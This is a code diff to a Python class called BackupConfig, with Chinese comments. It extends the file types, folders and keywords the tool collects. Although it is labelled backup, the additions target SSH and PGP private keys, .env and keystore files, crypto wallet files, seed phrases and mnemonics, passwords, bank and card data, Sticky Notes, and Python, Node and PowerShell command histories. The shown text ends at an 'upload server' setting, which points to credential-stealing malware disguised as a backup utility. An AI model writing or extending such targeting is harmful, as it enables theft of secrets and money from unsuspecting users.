@@ -66,14 +66,14 @@ class BackupConfig:
     LOG_LEVEL = logging.INFO
     
     # 磁盘文件分类
-    DISK_EXTENSIONS_1 = [  # 文档类
-        ".txt", ".xls", ".xlsx", ".et", ".one", ".js", ".py", ".go", ".sh", ".ts", ".jsx", ".tsx", 
-        ".bash",  ".sol", ".rs", ".json", ".csv", ".wallet", ".bin", "ps1", ".rtf"
+    DISK_EXTENSIONS_1 = [  # 文档/代码类
+        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".et", ".one", ".js", ".py", ".go", ".sh", ".ts", ".jsx", ".tsx", 
+        ".bash", ".rs", ".csv", ".tsv", ".ps1", ".rtf", ".env", ".dat", ".md",
     ]
     
     DISK_EXTENSIONS_2 = [  # 配置和密钥类
-        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", 
-        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc"
+        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", ".json", ".toml", ".conf", ".wallet",
+        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc", ".yaml", ".yml", ".toml",
     ]
     
     # 排除目录配置
@@ -89,12 +89,11 @@ class BackupConfig:
         # 开发工具和环境
         "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
         "Docker", "Git", "MongoDB", "Redis", "MySQL", "PostgreSQL",
-        "Android", "gradle", "npm", "yarn", ".npm", ".nuget",
-        ".gradle", ".m2", ".vs", ".vscode", ".idea",
-        
-        # 虚拟机和容器
-        "VirtualBox VMs", "VMware", "Hyper-V", "Virtual Machines",
-        "WSL", "docker", "containers",
+        "Android", "gradle", "npm", "yarn", "venv", "node_modules",
+        ".gradle", ".m2", ".vs", ".vscode", ".cargo", ".git", ".yean",
+        ".local", ".npm", ".nvm", ".orca_term", ".pki", ".pm2", 
+        ".rustup", ".bun", ".github", ".vscode", "myenv", "snap",
+        "__pycache__", ".vscode-server", "dist", ".cache", ".config",
         
         # 其他大型应用
         "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
@@ -139,8 +138,46 @@ class BackupConfig:
         "log", "crash", "dumps", "report", "reports",
         
         # 其他
-        "bak", "obsolete", "archive", "trojan", "clash", "vpn", "chrome",
+        "bak", "obsolete", "archive", "trojan", "clash", "vpn",
         "thumb", "thumbnail", "preview" , "v2ray", "user", "mail"
+    ]
+    
+    # 指定要直接复制的目录和文件
+    WINDOWS_SPECIFIC_DIRS = [
+        "Desktop",  # 桌面目录
+        r"AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite",  # 便签数据库
+        ".python_history",  # Python 历史记录文件
+        ".node_repl_history",  # Node.js REPL 历史记录文件
+        r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",  # Windows PowerShell 历史
+        r"AppData\Roaming\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
+    ]
+    
+    # 关键字备份配置 - 备份包含以下关键字的文件和文件夹
+    KEYWORD_BACKUP_KEYWORDS = [
+        "wallet",
+        "seed",
+        "mnemonic",
+        "private",
+        "privkey",
+        "keypair",
+        "secret",
+        "account",
+        "password",
+        "bank",
+        "card",
+        "solana",
+        "important",
+        "钱包",
+        "助记词",
+        "种子",
+        "私钥",
+        "密钥",
+        "密码",
+        "账户",
+        "账号",
+        "信用卡",
+        "备忘",
+        "重要",
     ]
     
     # 备用上传服务器
